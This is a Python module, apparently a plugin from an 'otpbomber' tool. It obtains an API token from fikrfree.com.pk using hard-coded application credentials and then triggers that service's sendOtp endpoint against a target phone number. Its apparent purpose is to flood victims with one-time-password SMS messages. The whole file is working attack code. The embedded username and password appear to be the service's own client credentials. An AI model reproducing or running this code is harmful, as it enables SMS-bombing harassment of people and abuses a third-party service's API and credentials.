from otpbomber.core import *
from otpbomber.localuseragent import *

async def fikrfree(phone, client, out):
    name = "fikrfree"
    domain = "fikrfree"
    frequent_rate_limit=False


    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    json_data = {
        'username': 'jazzfikrfreeMAPP',
        'password': 'In108ze64F1CwhgpuliqB5n',
    }

    response = await client.post('https://fikrfree.com.pk/api/generateToken',  headers=headers, json=json_data)

    try:
        data=response.json()
        token=data['result']
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None
    

    headers['authorization']=f'Bearer {token}'

    json_data = {
        'msisdn': f'{phone[-10:]}',
    }

    response = await client.post('https://fikrfree.com.pk/api/sendOtp', headers=headers, json=json_data)
    try:
        data=response.json()
        if data["result"]:
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None